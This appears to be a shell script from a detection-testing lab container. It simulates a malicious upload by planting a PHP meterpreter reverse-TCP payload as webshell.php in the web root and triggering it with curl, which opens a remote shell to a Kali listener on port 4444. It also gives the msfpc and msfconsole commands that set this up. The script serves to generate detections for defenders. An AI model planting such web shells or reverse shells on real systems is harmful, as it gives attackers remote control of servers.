#/bin/sh

echo -e "\e[92mSimulate a malicious file upload, which executes a reverse TCP meterpreter to Kali on port 4444\n"
echo -e "This scenario is multi-step, please follow these actions before confirming the Kali IP address:\n"

echo -e "1) Ensure you started this container using exposed ports (using below command) and a Kali host is available:"
echo -e "\033[33m\t$> docker run --rm -it -p 8080:80 mclaassen/cs_centos"

echo -e "\e[92m2) Generate the PHP Listener on a Kali machine (replace the IP address with your Kali IP):"
echo -e "\033[33m\t$> msfpc php reverse stageless tcp 172.17.0.21 4444"

echo -e "\e[92m3) Start listener: "
echo -e "\033[33m\t$> msfconsole -r ./php-meterpreter-stageless-reverse-tcp-4444-php.rc\e[92m\n"

read -e -p "Please enter your Kali host IP Address [172.17.0.21]: " ip_addr

if [ -z "$ip_addr" ]
then
      ip_addr="172.17.0.21"
fi

echo "Starting remote shell to: $ip_addr:4444"

sed s/172\.17\.0\.21/$ip_addr/g /var/www/html/uploads/php-meterpreter-stageless-reverse-tcp-4444.php  > /var/www/html/uploads/webshell.php

curl -s http://localhost/uploads/webshell.php & >/dev/null

echo -e "Execute commands from the meterpreter shell on your Kali host to generate a detection (session -i and shell). For more information see the Linux webshell detection on Wiki"
echo -e "Please note that this shell will remain active in the background until the container is terminated."
sleep 5
